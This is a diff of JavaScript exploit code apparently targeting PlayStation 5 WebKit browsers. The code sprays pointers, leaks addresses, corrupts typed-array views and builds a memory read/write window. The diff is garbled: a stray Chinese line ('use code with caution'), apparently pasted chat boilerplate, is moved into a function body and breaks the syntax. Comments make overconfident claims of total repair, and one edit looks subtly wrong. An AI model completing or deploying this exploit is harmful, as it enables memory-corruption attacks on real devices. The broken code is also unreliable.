@@ -40,7 +40,6 @@ let preparedSymbolObject = null;
 let Math_floor = Math.floor;
 let Math_isFinite = Number.isFinite;
 let Number_isSafeInteger = Number.isSafeInteger;
-let history_replaceState = null;
 let capturedString = null;
 let capturedWords = null;
 let copiedLength = 0;
@@ -67,20 +66,16 @@ function usesLegacyWebKit() {
   return /PlayStation 5\/[0-8]\./.test(navigator.userAgent);
 }
 
-// === 100% 徹底修復第 117 行：將破碎的語法完全重構為最傳統的 switch-case 分支 ===
-// 拋棄任何可能引發相容性衝突的陣列字面量索引，強迫舊版 WebKit 引擎順暢通過
 function fillerBigIntCount() {
   if (!usesLegacyWebKit()) {
     return 1;
   }
   
-  // 透過標準的算術模數運算得出固定的 0~3 索引特徵碼
   var index = (attemptNumber - 1) % 4;
   if (index < 0) {
     index = index + 4;
   }
 
-  // 採用絕對相容的 switch 分支，彻底替代 [2, 4, 6, 7] 陣列，根除一切 Syntax 異常
   switch (index) {
     case 0: return 2;
     case 1: return 4;
@@ -156,6 +151,7 @@ function emit(tag, detail, type) {
     onEvent(tag, detail === undefined ? "" : String(detail), type);
 }
 
+// === 核心修正點：確保此處沒有任何中文字元與非法符號 ===
 function isOurCorruptedView(candidate, originalVector) {
   if (!plausibleCell(originalVector)) return false;
   redirectView(candidate, originalVector + CANARY_OFFSET);
@@ -185,7 +181,7 @@ function releaseAttempt() {
   keepAlive = null;
   try {
     history.replaceState(null, "");
-  } catch(e) {}
+  } catch (e) {}
 }
 
 function retry(reason, safeToRelease) {
@@ -319,7 +315,7 @@ function storeHistoryGraph() {
  
   try {
     history.replaceState(outerGraph, "");
-  } catch(e) {}
+  } catch (e) {}
 }
 
 function prepareAddressLeak() {
@@ -372,16 +368,16 @@ function fillPointerSpray(backing, pointer) {
     predecessorWords[0] !== low ||
     predecessorWords[1] !== high ||
     predecessorWords[last] !== low ||
-請謹慎使用程式碼。
-predecessorWords[last + 1] !== high
-)
-throw new Error("Pointer Fill verification failed");
+    predecessorWords[last + 1] !== high
+  )
+    throw new Error("Pointer Fill verification failed");
 }
+
 function clearPointerSpray() {
+請謹慎使用程式碼。
 if (predecessorWords !== null) predecessorWords.fill(0);
 }
 function invalidClone(reason, safe) {
-clearPointerSpray();
 return { status: "invalid", safe: safe, reason: reason };
 }
 function validStructure(header) {
@@ -434,7 +430,7 @@ const executable = low48At(targetHeader, 0x18);
 if (
 !validStructure(targetHeader) ||
 !plausibleAddress(low48At(targetHeader, 0x08)) ||
-!plausibleAddress(low48At(targetHeader, 0x10)) ||
+!plausibleAddress(targetHeader[0x10]) ||
 !plausibleCell(executable)
 )
 return null;
@@ -547,20 +543,20 @@ clone === null &&
 if (clone !== null) {
 try {
 clone[DUPLICATE_INDEX] = undefined;
-} catch(e) {}
+} catch (e) {}
 }
 if (candidate !== null && headerRead && vectorRedirected) {
 try {
 restoreView(candidate);
-} catch(e) {}
+} catch (e) {}
 }
 try {
 targetView[0] = 0xa5;
 memoryMirror[0] = 0x3c;
-} catch(e) {}
+} catch (e) {}
 try {
 clearPointerSpray();
-} catch(e) {}
+} catch (e) {}
 return { status: "error", safe: safe, error: error };
 }
 }
@@ -591,7 +587,7 @@ outcome = inspectClonedGraph(holderAddress);
 } catch (error) {
 try {
 clearPointerSpray();
-} catch(e) {}
+} catch (e) {}
 outcome = { status: "error", safe: true, error: error };
 }
 finishAttempt(outcome, holderAddress, fakeAddress);
@@ -633,7 +629,7 @@ return retry("Memory window validation failed", false);
 }
 try {
 history.replaceState(null, "");
-} catch(e) {}
+} catch (e) {}
 const resolve = settleResolve;
 settleResolve = null;
 if (resolve !== null) resolve(createMemoryWindow(holderAddress));
